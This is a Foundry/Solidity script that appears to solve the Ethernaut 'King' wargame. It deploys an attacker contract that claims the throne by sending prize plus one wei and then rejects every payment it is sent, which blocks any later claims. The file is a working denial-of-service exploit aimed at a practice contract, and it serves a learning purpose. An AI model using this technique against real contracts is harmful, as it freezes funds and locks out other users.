// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/King.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

error Attacker__DOS();
error Attacker__Failed();

contract Attacker {
    King public king;

    constructor(King _king) {
        king = _king;
    }

    receive() external payable {
        revert Attacker__DOS();
    }

    function attack() public payable {
        (bool success,) = address(king).call{value: msg.value}("");
        if (!success) {
            revert Attacker__Failed();
        }
    }
}

contract KingScript is Script {
    address constant ETHERNAUT_CONTRACT_ADDRESS = 0x2882F61903476014AEcEE857f2C543C58a3bB42E;
    King public king = King(payable(ETHERNAUT_CONTRACT_ADDRESS));

    Attacker attacker;

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        attacker = new Attacker(king);
        uint256 prize = king.prize();
        prize += 1;

        attacker.attack{value: prize}();

        vm.stopBroadcast();
    }
}
